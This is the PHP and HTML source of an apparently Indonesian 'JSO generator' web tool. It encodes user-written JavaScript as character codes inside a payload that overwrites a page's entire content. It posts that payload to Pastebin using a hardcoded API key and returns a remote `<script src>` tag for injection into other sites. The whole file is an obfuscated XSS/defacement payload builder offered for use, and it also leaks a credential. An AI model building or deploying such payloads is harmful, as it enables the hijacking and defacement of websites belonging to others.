<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
$judul = "JSO GENERATOR";
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title><?= $judul ?></title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    body {
      background-color: #f8f9fa;
      font-family: 'Segoe UI', sans-serif;
    }
    .card-custom {
      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
      transition: transform 0.2s ease-in-out;
    }
    .card-custom:hover {
      transform: scale(1.01);
      box-shadow: 0 12px 24px rgba(0,0,0,0.3);
    }
    .btn-outline-primary:hover {
      background-color: #0d6efd;
      color: white;
    }
    #loading {
      display: none;
    }
  </style>
</head>
<body>

<div class="container py-5">
  <div class="row justify-content-center">
    <div class="col-md-10">
      <div class="card card-custom bg-white p-4">
        <div class="card-body">
          <h3 class="card-title text-center text-primary"><?= $judul ?></h3>
          <p class="text-center">Tulis script JavaScript kamu, convert ke ASCII, lalu buat Pastebin embed otomatis.</p>

          <form name="charCodeAt" method="post" id="jsoForm">
            <div class="mb-3">
              <label for="input" class="form-label">Script Input</label>
              <textarea name="input" class="form-control" rows="5" placeholder="Tulis script JS kamu di sini..."></textarea>
            </div>

            <div class="text-center mb-3">
              <button type="button" onclick="runCharCodeAt()" class="btn btn-outline-primary">Convert</button>
            </div>

            <div class="mb-3">
              <label for="output" class="form-label">Hasil Convert (charCode)</label>
              <textarea name="output" class="form-control" readonly rows="5" placeholder="Hasil ASCII..."></textarea>
            </div>

            <div class="text-center">
              <button type="submit" name="submit" class="btn btn-outline-success">Create</button>
            </div>
          </form>

          <div id="loading" class="text-center mt-4">
            <div class="spinner-border text-primary" role="status">
              <span class="visually-hidden">Loading...</span>
            </div>
            <p class="mt-2 text-muted">Processing Pastebin... Tunggu 5 detik</p>
          </div>

          <?php
          if (isset($_POST['submit'])) {
              if (empty($_POST['output'])) {
                  echo "<script>Swal.fire('Error','Convert dulu sebelum Create!','error');</script>";
              } else {
                  $isi = $_POST['output'];
                  $random = rand(1, 99999999);
                  $api_dev_key = '633fcbdacbff82bfd5dd821a9f8921f7';
                  $api_paste_code = "document.documentElement.innerHTML=String.fromCharCode(".$isi.")";
                  $api_paste_private = '0';
                  $api_paste_name = urlencode($random);
                  $api_paste_expire_date = 'N';
                  $api_paste_format = 'text';
                  $api_user_key = '';
                  $api_paste_code = urlencode($api_paste_code);

                  $url = 'https://pastebin.com/api/api_post.php';
                  $ch = curl_init($url);
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=paste&api_user_key='.$api_user_key.'&api_paste_private='.$api_paste_private.'&api_paste_name='.$api_paste_name.'&api_paste_expire_date='.$api_paste_expire_date.'&api_paste_format='.$api_paste_format.'&api_dev_key='.$api_dev_key.'&api_paste_code='.$api_paste_code.'');
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_VERBOSE, 1);
                  curl_setopt($ch, CURLOPT_NOBODY, 0);
                  
                  $response = curl_exec($ch);
                  $hasil = str_replace('https://pastebin.com', 'https://pastebin.com/raw', $response);
                  $finalScript = '<script type="text/javascript" src="'.$hasil.'"></script>';
                  $escaped = htmlspecialchars($finalScript);
                  ?>

                  <script>
                    document.getElementById("loading").style.display = "block";
                    setTimeout(function() {
                      document.getElementById("loading").style.display = "none";
                      Swal.fire({
                        title: 'Berhasil!',
                        html: `<textarea id="jsoanym" class="form-control mb-2" readonly rows="3"><?= $escaped ?></textarea>
                              <button class='btn btn-primary' onclick="copyResult()">Copy Code</button>`,
                        icon: 'success',
                        showConfirmButton: false
                      });
                    }, 5000);
                  </script>

              <?php }
          }
          ?>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
function runCharCodeAt() {
    const input = document.charCodeAt.input.value;
    let output = "";
    for(let i = 0; i < input.length; i++) {
        if (output !== "") output += ", ";
        output += input.charCodeAt(i);
    }
    document.charCodeAt.output.value = output;
}

function copyResult() {
  var copyText = document.getElementById("jsoanym");
  copyText.select();
  copyText.setSelectionRange(0, 99999);
  document.execCommand("copy");
  Swal.fire('Copied!', '', 'success');
}
</script>

</body>
</html>